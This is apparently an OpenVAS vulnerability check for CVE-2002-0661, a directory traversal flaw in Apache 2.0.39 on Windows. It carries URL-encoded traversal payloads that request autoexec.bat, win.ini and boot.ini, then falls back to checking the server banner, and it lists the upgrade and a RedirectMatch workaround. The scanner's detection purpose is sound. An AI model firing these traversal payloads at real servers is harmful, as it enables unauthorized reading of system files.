# OpenVAS Vulnerability Test
# $Id: apache_win32_dir_trav.nasl 6056 2017-05-02 09:02:50Z teissa $
# Description: Apache 2.0.39 Win32 directory traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# starting from badblue_directory_traversal.nasl by SecurITeam.
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Reference
# From:"Auriemma Luigi" <aluigi@pivx.com>
# To:bugtraq@securityfocus.com
# Subject: Apache 2.0.39 directory traversal and path disclosure bug
# Date: Fri, 16 Aug 2002 17:01:29 +0000

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11092");
 script_version("$Revision: 6056 $");
 script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_tag(name: "qod_type", value: "remote_vul");

 script_tag(name: "solution_type", value: "VendorFix");

 script_cve_id("CVE-2002-0661");
 script_bugtraq_id(5434);

 script_name("Apache 2.0.39 Win32 directory traversal");

 script_category(ACT_ATTACK);

 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 script_family("Web Servers");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");

 script_tag(name: "summary", value: "Apache 2.0.39 Win32 directory traversal");

 script_tag(name: "vuldetect", value: "Sends a crafted GET request and checks the response.");

 script_tag(name: "insight", value: "A security vulnerability in Apache 2.0.39 on Windows systems
allows attackers to access files that would otherwise be inaccessible using a directory traversal attack.");

 script_tag(name: "impact", value: "A cracker may use this to read sensitive files or even execute any
command on your system.");

 script_tag(name: "affected", value: "Apache 2.0 through 2.0.39 on Windows");

 script_tag(name: "solution", value: "Upgrade to Apache 2.0.40 or later.
As a workaround add in the httpd.conf, before the first 'Alias' or 'Redirect' directive:
   RedirectMatch 400 \\\.\.");

 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);
if ( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);
banner = get_http_banner(port:port);
if ( "Apache" >!< banner ) exit(0);

cginameandpath[0] = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cautoexec.bat";
cginameandpath[1] = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini";
cginameandpath[2] = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini";
cginameandpath[3] = "";

for (i = 0; cginameandpath[i]; i = i + 1)
{ 
  u = cginameandpath[i];
  if(check_win_dir_trav(port: port, url:u))
  {
    security_message(port:port);
    exit(0);
  }
}

banner = get_http_banner(port: port);
if (! banner) exit(0);
if (egrep(string: banner, pattern:"^Server: *Apache(-AdvancedExtranetServer)?/2\.0\.[0-3][0-9]* *\(Win32\)"))
{
  m = "
A security vulnerability in Apache 2.0.39 on Windows systems
allows attackers to access files that would otherwise be 
inaccessible using a directory traversal attack.

** OpenVAS found that your server should be vulnerable according to
** its version number but could not exploit the flaw.
** You may have already applied the RedirectMatch wordaround.
** Anyway, you should upgrade your server to Apache 2.0.40";
  security_message(port: port, data: m);
}
